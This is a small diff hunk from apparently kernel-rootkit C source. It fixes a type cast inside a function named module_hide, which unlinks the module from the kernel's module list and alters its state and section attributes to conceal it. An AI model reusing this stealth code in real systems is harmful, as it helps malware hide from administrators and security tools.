@@ -239,7 +239,7 @@ void module_hide(void) {
         kfree(use);
     }
     
-    THIS_MODULE->list.prev = (list_head *)0xDEAD000000000122LL;
+    THIS_MODULE->list.prev = (struct list_head *)0xDEAD000000000122LL;
     THIS_MODULE->state = MODULE_STATE_UNFORMED; // Change state to prevent loading
 	
     THIS_MODULE->sect_attrs = NULL;
